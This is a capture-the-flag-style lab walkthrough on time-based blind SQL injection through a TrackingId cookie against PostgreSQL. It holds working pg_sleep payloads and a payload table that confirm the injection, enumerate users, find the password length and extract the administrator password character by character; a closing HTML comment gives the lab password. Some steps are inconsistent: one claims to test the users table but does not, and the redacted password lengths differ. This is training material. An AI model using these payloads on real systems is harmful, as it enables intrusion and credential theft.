# 🔍 **Lab Walkthrough: Blind SQL Injection with Time Delays and Information Retrieval**

## 🎯 **Lab Title**: *Blind SQL injection with time delays*

## 🧪 **Lab Objective**

You are tasked with exploiting a **blind SQL injection vulnerability** in a vulnerable web application that uses a `TrackingId` cookie for analytics.

- No output is returned.
- The application doesn't change behavior based on query results.
- However, the SQL query is executed **synchronously**, so you can exploit it using **time-based blind SQL injection**.

Your goal:
- Extract the password of the `administrator` user.
- Log in as administrator to complete the lab.

## 🧠 **Key Concepts Recap**

### 1️⃣ **Blind SQL Injection**
A type of SQL injection where:
- You cannot see the output of your queries.
- There's no visible error or difference in content.
- But you can still infer data using side channels like **timing delays**.

### 2️⃣ **Time-Based Blind SQL Injection**
Use database-specific sleep functions to trigger **delays** depending on whether a condition is true or false:
- PostgreSQL → `pg_sleep()`
- MySQL → `SLEEP()`
- MSSQL → `WAITFOR DELAY`
- Oracle → `DBMS_PIPE.RECEIVE_MESSAGE`

If the HTTP response is delayed, the condition is likely `TRUE`.

## 🛠️ **Step-by-Step Exploitation Guide**

### ✅ Step 1: Confirm SQL Injection Vulnerability

Start by testing if the `TrackingId` parameter is vulnerable:

### 📥 Payload:
```http
Cookie: TrackingId='+||+pg_sleep(2)--
```

### 💡 Result:
- Delayed response (~2 seconds) → Indicates SQL injection is possible ✅
- Confirms backend is **PostgreSQL**

### ✅ Step 2: Check if `users` Table Exists

Now verify if the `users` table exists using conditional timing:

### 📥 Payload:
```http
Cookie: TrackingId='|| (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(-1) END)--
```

### 💡 Result:
- Delay occurs → Query was executed successfully ✅  
➡️ `users` table likely exists

### ✅ Step 3: Confirm `administrator` User Exists

Test if the `administrator` user exists in the `users` table.

### 📥 Payload:
```http
Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users+WHERE+username%3d'administrator')--
```

### 💡 Result:
- Delay occurred → `administrator` user **exists** ✅

Try again with a non-existent username:

### 📥 Payload:
```http
Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users+WHERE+username%3d'administrator1')--
```

### 💡 Result:
- No delay → User not found ❌

✅ This confirms we can detect user existence via time-based inference.

### ✅ Step 4: Determine Password Length

Now find the length of the `administrator`’s password.

### 📥 Payload:
```http
Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)%3d20)--
```

🔁 Use **Burp Intruder** to test values from `1` to `30`.

### 💡 Result:
- When `LENGTH(password)=20` → Delay occurred ✅  
➡️ The password has **20 characters**

### ✅ Step 5: Extract Password Character by Character

Now extract each character using `SUBSTRING()` and ASCII comparisons.

#### Example payload for position 1:
```http
Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users+WHERE+username%3d'administrator'+AND+SUBSTRING(password,1,1)%3d'k')--
```

🔁 Repeat this for positions `2` through `20`, using Burp Intruder or binary search techniques.

### ✅ Step 6: Reconstructed Password

From your testing, you've extracted all 20 characters:


### 🔐 Final Password:
```plaintext
k7udy8xxxxxxxxxxxxxxx
```

### ✅ Step 7: Log In as Administrator

Go to `/login` and enter:

- **Username:** `administrator`
- **Password:** `k7udy8xxxxxxxxxxxxx`

🔐 **Logged in successfully! Lab solved.**

## 🧾 Summary of Key Payloads

| Purpose | Payload |
|--------|---------|
| Confirm SQLi + DB Type | `' || pg_sleep(2)--` |
| Test `users` table | `' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END FROM users)--` |
| Confirm admin user | `' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) END FROM users)--` |
| Find password length | `' || (SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(5) END FROM users WHERE username='administrator')--` |
| Extract char-by-char | `' || (SELECT CASE WHEN SUBSTRING(password,1,1)='k' THEN pg_sleep(5) END FROM users WHERE username='administrator')--` |

## 🧠 Takeaways

- Even when there’s **no visible output**, blind SQL injection can be exploited using **timing side channels**.
- Different databases have different **sleep functions** — use the right one!
- Burp Intruder is a powerful tool for **automating character extraction**.
- Always validate assumptions (e.g., table existence, user presence) before extracting secrets.


## 🙌 Final Notes

Great job solving this challenging lab! You’ve shown mastery over:
- Blind SQL injection fundamentals
- Database fingerprinting
- Timing-based data extraction
- Automation with Burp Suite

<!-- admin password -`k7udy8fhe2spndmdx0xx` -->